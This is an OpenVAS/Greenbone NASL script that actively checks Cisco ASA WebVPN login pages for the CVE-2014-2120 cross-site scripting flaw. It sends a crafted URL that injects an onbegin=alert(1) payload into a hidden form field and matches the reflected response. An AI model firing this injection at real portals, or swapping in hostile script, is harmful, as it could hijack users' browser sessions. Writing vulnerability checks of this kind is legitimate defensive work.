# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:cisco:asa";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.806687");
  script_version("2024-12-04T05:05:48+0000");
  script_cve_id("CVE-2014-2120");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2024-12-04 05:05:48 +0000 (Wed, 04 Dec 2024)");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2024-11-14 21:42:05 +0000 (Thu, 14 Nov 2024)");
  script_tag(name:"creation_date", value:"2016-02-22 13:34:22 +0530 (Mon, 22 Feb 2016)");
  script_name("Cisco ASA WebVPN Login Page XSS Vulnerability (cisco-sa-CVE-2014-2120, CSCun19025) - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("CISCO");
  script_dependencies("gb_cisco_asa_http_detect.nasl");
  script_require_ports("Services/www", 443);
  script_mandatory_keys("cisco/asa/webvpn/detected");

  script_xref(name:"URL", value:"https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-CVE-2014-2120");
  script_xref(name:"URL", value:"https://tools.cisco.com/bugsearch/bug/CSCun19025");
  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/135813");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2016/Feb/82");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/66290");
  script_xref(name:"URL", value:"https://www.trustwave.com/Resources/SpiderLabs-Blog/CVE-2014-2120-%E2%80%93-A-Tale-of-Cisco-ASA-%E2%80%9CZero-Day%E2%80%9D/");
  script_xref(name:"URL", value:"https://www3.trustwave.com/spiderlabs/advisories/TWSL2014-008.txt");
  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");
  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");

  script_tag(name:"summary", value:"Cisco Adaptive Security Appliance (ASA) SSL VPN is prone to a
  cross-site scripting (XSS) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaw is due to an error in password recovery form which
  fails to filter properly the hidden inputs.

  NOTE: The vulnerability was verified on Internet Explorer 6.0 (more modern browsers are
  unaffected).");

  script_tag(name:"impact", value:"Successful exploitation allows the attacker to execute arbitrary
  HTML and script code in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"Cisco ASA Software versions 8.4(7) and prior and 9.1(4) and
  prior are vulnerable.");

  script_tag(name:"solution", value:"Updates are available, please see the references for more
  information.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

prestr  = rand_str( length:6, charset:"abcdefghijklmnopqrstuvwxyz0123456789" );
poststr = rand_str( length:11, charset:"abcdefghijklmnopqrstuvwxyz0123456789" );

url = dir + "/+CSCOE+/logon.html?reason=2&a0=63&a1=&a2=&a3=0&next=&auth_handle=" + prestr +
            '"%20style%3dbehavior%3aurl(%23default%23time2)%20onbegin%3dalert(1)%20' + poststr +
            "&status=0&username=&password_min=0&state=&tgroup=&serverType=0&password_days=0";

# Unpatched versions are returning:
# <input type=hidden name=auth_handle    value="0712b0\" style=behavior:url(#default#time2) onbegin=alert(1) 09094cf0a35">
# Patched versions are returning:
# <input type=hidden name=auth_handle    value="39325z&quot; style=behavior:url(#default#time2) onbegin=alert(1) envhdgoxffc">

check_pattern = '<input type=hidden name=auth_handle\\s+value="' + prestr + '\\\\" style=behavior:url\\(#default#time2\\) onbegin=alert\\(1\\) ' + poststr + '">';

if( http_vuln_check( port:port, url:url, check_header:TRUE, pattern:check_pattern, extra_check:make_list( ">New Password<", ">SSL VPN Service<" ) ) ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
